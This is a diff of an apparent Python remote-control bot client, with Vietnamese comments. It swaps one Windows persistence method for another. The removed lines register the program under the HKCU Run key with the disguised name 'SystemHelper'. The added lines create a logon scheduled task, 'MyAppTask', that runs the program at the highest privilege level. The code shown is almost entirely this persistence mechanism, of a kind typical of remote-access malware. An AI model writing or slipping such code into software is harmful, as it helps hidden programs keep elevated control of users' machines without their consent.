@@ -539,19 +539,20 @@ if not is_admin():
 
 import winreg
  
-exe_path = os.path.abspath(sys.executable)  # "chính tôi"
  
 if __name__ == "__main__":
     print(f"Client started with ID: {CLIENT_ID}")
+    exe_path = os.path.abspath(__file__)  # Nếu đang chạy từ exe, sẽ là chính file exe đó
 
-
-    key = winreg.OpenKey(
-        winreg.HKEY_CURRENT_USER,
-        r"Software\Microsoft\Windows\CurrentVersion\Run",
-        0,
-        winreg.KEY_SET_VALUE
-    )
-    winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, exe_path)
-    winreg.CloseKey(key)
+    # Tạo task Scheduler để chạy khi user đăng nhập
+    subprocess.run([
+        "schtasks",
+        "/Create",
+        "/SC", "ONLOGON",
+        "/TN", "MyAppTask",
+        "/TR", exe_path,
+        "/RL", "HIGHEST",
+        "/F"
+    ])
 
     bot.polling()
